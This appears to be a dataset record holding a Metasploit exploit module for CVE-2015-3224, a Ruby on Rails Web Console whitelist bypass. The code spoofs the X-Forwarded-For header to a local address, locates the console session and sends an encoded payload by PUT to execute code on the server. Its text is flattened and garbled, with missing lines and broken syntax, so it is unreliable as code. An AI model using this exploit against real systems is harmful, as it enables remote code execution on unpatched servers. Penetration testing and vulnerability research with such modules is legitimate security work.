{
    "text": "vul_name : Ruby on Rails 4.0.x / 4.1.x / 4.2.x Whitelist Bypass Code Execution ， vul_cve : CVE-2015-3224 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， super ( update_info ( info ,  ， 'Name' => 'Ruby on Rails Web Console ( v2 ) Whitelist Bypass Code Execution' ,  ， 'Description' => %q{ ， This module exploits an IP whitelist bypass vulnerability in the developer ， web console included with Ruby on Rails 4.0.x and 4.1.x. This module will also ， achieve code execution on Rails 4.2.x if the attack is launched from a ， whitelisted IP range. ， } ,  ， 'Author' => [  ， 'joernchen <joernchen [ at ] phenoelit.de>' ,  # Discovery & disclosure ， 'Ben Murphy <benmmurphy @ gmail.com>' ,  # Discovery & disclosure ， 'hdm' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2015-3224' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => 'ruby' ,  ， 'Arch' => ARCH_RUBY ,  ， 'Privileged' => false ,  ， 'Targets' => [  [ 'Automatic' , {} ]  ]  ,  ， 'DefaultOptions' => { 'PrependFork' => true } ,  ， 'DisclosureDate' => 'Jun 16 2015' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， Opt : RPORT ( 3000 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The path to a vulnerable Ruby on Rails application' , '/missing404' ]  )  ，  ]  , self.class )  ， end ，  # Identify the web console path and session ID , then inject code with it ， def exploit ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path )  ,  ， 'method' => 'GET' ,  ， 'headers' => { ， 'X-Forwarded-For' => '0000 : 1' ， } ， } , 25 )  ， unless res ， print_error ( \"Error : No response requesting # {datastore [ 'TARGETURI' ] }\" )  ， end ， web_console_path = nil ，  # Support vulnerable Web Console versions ， web_console_path = \"/\" + $ 1 ， end ，  # Support newer Web Console versions ， web_console_mount = $ 1 ， unless res.body.to_s = ~ /data-session-id=' (  [ ^' ] + ) '/ ， print_error ( \"Error : No session id found requesting # {datastore [ 'TARGETURI' ] }\" )  ， end ， web_console_path = normalize_uri ( web_console_mount , 'repl_sessions' ,  $ 1 )  ， end ， unless web_console_path ， print_error ( 'Error : The web console is patched , disabled , or you are not in the whitelisted scope' )  ， print_error ( \"Error : No web console path found when requesting # {datastore [ 'TARGETURI' ] }\" )  ， end ， end ， print_status ( \"Sending payload to # {web_console_path}\" )  ， res = send_request_cgi ( { ， 'uri' => web_console_path ,  ， 'method' => 'PUT' ,  ， 'headers' => { ， 'X-Forwarded-For' => '0000 : 1' ,  ， 'Accept' => 'application/vnd.web-console.v2' ,  ， 'X-Requested-With' => 'XMLHttpRequest' ， } ,  ， 'vars_post' => { ， 'input' => payload.encoded ， } ， } , 25 )  ， end ， end",
    "time": "2017.03.23"
}